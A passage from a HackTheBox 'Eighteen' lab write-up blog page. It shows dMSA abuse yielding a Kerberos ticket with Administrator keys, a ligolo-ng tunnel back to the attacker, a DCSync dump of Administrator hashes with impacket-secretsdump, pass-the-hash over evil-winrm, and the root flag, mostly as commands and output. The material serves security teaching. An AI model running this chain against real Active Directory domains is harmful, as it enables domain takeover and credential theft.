dwEgdl9gdYwgdOggdAwgc0wgcqgKzApoAMCARKhIgQguYmVOMdoavbs5aAbzgK/8hyY6nEAfGfUra/HWDmKgpKhDhsMZWlnaHRlZW4uaHRiohYwFKADAgEBoQ0wCxsJdGVzdGRtc2EkowcDBQBAoQAApREYDzIwMjUxMTE5MTUwMjM4WqYRGA8yMDI1MTExOTE1MTczOFqnERgPMjAyNTExMjYxNTAyMjRaqA4bDEVJR0hURUVOLkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMRUlHSFRFRU4uSFRC</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/EIGHTEEN.HTB</span><br><span class="line">  ServiceRealm             :  EIGHTEEN.HTB</span><br><span class="line">  UserName                 :  testdmsa$ (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  eighteen.htb</span><br><span class="line">  StartTime                :  11/19/2025 7:02:38 AM</span><br><span class="line">  EndTime                  :  11/19/2025 7:17:38 AM</span><br><span class="line">  RenewTill                :  11/26/2025 7:02:24 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable</span><br><span class="line">  KeyType                  :  aes256_cts_hmac_sha1</span><br><span class="line">  Base64(key)              :  uYmVOMdoavbs5aAbzgK/8hyY6nEAfGfUra/HWDmKgpI=</span><br><span class="line">  Current Keys for testdmsa$: (aes256_cts_hmac_sha1) BB89D70E8C37CD6EE283DC4C7F9356BFE256D1DA23DCDCAE221B7A88D0CD1DC8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is 0:0x196093</span><br><span class="line"></span><br><span class="line">Cached Tickets: (1)</span><br><span class="line"></span><br><span class="line">#0&gt;     Client: testdmsa$ @ eighteen.htb</span><br><span class="line">        Server: krbtgt/EIGHTEEN.HTB @ EIGHTEEN.HTB</span><br><span class="line">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Ticket Flags 0x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize</span><br><span class="line">        Start Time: 11/19/2025 7:02:38 (local)</span><br><span class="line">        End Time:   11/19/2025 7:17:38 (local)</span><br><span class="line">        Renew Time: 11/26/2025 7:02:24 (local)</span><br><span class="line">        Session Key Type: AES-256-CTS-HMAC-SHA1-96</span><br><span class="line">        Cache Flags: 0x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The ticket is now cached. We have a TGT for <code>testdmsa$</code> that carries the Administrator’s keys.</p>
+<h2 id="Tunneling-with-Ligolo-ng"><a href="#Tunneling-with-Ligolo-ng" class="headerlink" title="Tunneling with Ligolo-ng"></a>Tunneling with Ligolo-ng</h2><p>To use the ticket from our attacking machine, we set up a tunnel using <code>ligolo-ng</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ sudo ip tuntap add user kali mode tun ligolo</span><br><span class="line">[sudo] password for kali:</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ sudo ip link set ligolo up</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ ./proxy -selfcert</span><br><span class="line">INFO[0000] Loading configuration file ligolo-ng.yaml</span><br><span class="line">WARN[0000] Using default selfcert domain &#x27;ligolo&#x27;, beware of CTI, SOC and IoC!</span><br><span class="line">INFO[0000] Listening on 0.0.0.0:11601</span><br><span class="line">INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080</span><br><span class="line">WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.</span><br><span class="line">    __    _             __</span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/</span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /</span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /</span><br><span class="line">        /____/                          /____/</span><br><span class="line"></span><br><span class="line">  Made in France ♥            by @Nicocha30!</span><br><span class="line">  Version: 0.8.2</span><br><span class="line"></span><br><span class="line">[Agent : EIGHTEEN\adam.scott@DC01] »</span><br><span class="line">ligolo-ng » INFO[7164] Agent joined.                                 id=005056b0cf44 name=&quot;EIGHTEEN\\adam.scott@DC01&quot; remote=&quot;10.129.136.7:61127&quot;</span><br><span class="line">ligolo-ng »</span><br><span class="line">ligolo-ng » session</span><br><span class="line">? Specify a session : 2 - EIGHTEEN\adam.scott@DC01 - 10.129.136.7:61127 - 005056b0cf44</span><br><span class="line">[Agent : EIGHTEEN\adam.scott@DC01] » start</span><br><span class="line">INFO[7195] Starting tunnel to EIGHTEEN\adam.scott@DC01 (005056b0cf44)</span><br><span class="line">[Agent : EIGHTEEN\adam.scott@DC01] » ERRO[7226] connection was refused</span><br><span class="line">ERRO[7281] connection was refused</span><br><span class="line">[Agent : EIGHTEEN\adam.scott@DC01] »</span><br><span class="line">[Agent : EIGHTEEN\adam.scott@DC01] »</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="DCSync-Dumping-the-Administrator-Hash"><a href="#DCSync-Dumping-the-Administrator-Hash" class="headerlink" title="DCSync - Dumping the Administrator Hash"></a>DCSync - Dumping the Administrator Hash</h2><p>We convert the base64 ticket to a <code>.kirbi</code> file, then to a <code>.ccache</code> for use with Impacket:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ nano ticket.kirbi                                                                                                   </span><br><span class="line">                                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ cat ticket.kirbi | base64 -d &gt; real.kirbi</span><br><span class="line"></span><br><span class="line">                                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ ticketConverter.py real.kirbi ticket.ccache                                                                         </span><br><span class="line"></span><br><span class="line">Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br><span class="line">                                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Downloads/ligolo-ng_proxy_0.8.2_linux_amd64]</span><br><span class="line">└─$ export KRB5CCNAME=$(pwd)/ticket.ccache                                                                              </span><br></pre></td></tr></table></figure></div>
+
+<p>We sync the clock with the DC and perform a DCSync to dump the Administrator’s NTLM hash:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntpdate dc01.eighteen.htb ;impacket-secretsdump -k -no-pass eighteen.htb/testdmsa\$@dc01.eighteen.htb -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator</span><br><span class="line">2025-11-19 12:37:18.197197 (-0500) +25204.965372 +/- 0.473467 dc01.eighteen.htb 240.0.0.1 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25204.965372</span><br><span class="line">Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b</span><br><span class="line">Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f</span><br><span class="line">Administrator:0x17:0b133be956bfaddf9cea56701affddec</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>With the Administrator NTLM hash, we pass-the-hash over WinRM to get a shell as Administrator:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">─$ evil-winrm -i 10.129.136.7 -u administrator -H 0b133be956bfaddf9cea56701affddec</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion   </span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../desktop/root.txt</span><br><span class="line">305caa3bf08f53f73ac8a821675e3a4a</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Eighteen was a great box showcasing the abuse of the new <strong>Delegated Managed Service Account (dMSA)</strong> feature in Windows Server 2025. The attack chain went from MSSQL credential reuse, through login impersonation and database enumeration, to hash cracking and password spraying for initial access. The privilege escalation leveraged the dMSA <code>msDS-ManagedAccountPrecededByLink</code> attribute to impersonate the Administrator and perform a DCSync, fully compromising the domain.</p>
+<p>Hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Eighteen</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-04-12 21:54:29</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-12 23:59:22
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/04/12/Hackthebox-Eighteen/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/MSSQL/">#MSSQL</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/dMSA/">#dMSA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Kerberos/">#Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Active-Directory/">#Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Password-Reuse/">#Password Reuse</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Ligolo/">#Ligolo</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/04/07/Hackthebox-DarkZero/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: DarkZero</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Eighteen</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSQL-Enumeration"><span class="nav-text">MSSQL Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cracking-the-Hash"><span class="nav-text">Cracking the Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Domain-User-Enumeration"><span class="nav-text">Domain User Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Flag-Password-Spraying"><span class="nav-text">User Flag - Password Spraying</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-dMSA-Abuse"><span class="nav-text">Privilege Escalation - dMSA Abuse</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunneling-with-Ligolo-ng"><span class="nav-text">Tunneling with Ligolo-ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DCSync-Dumping-the-Administrator-Hash"><span class="nav-text">DCSync - Dumping the Administrator Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root-Flag"><span class="nav-text">Root Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-text">Conclusion</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
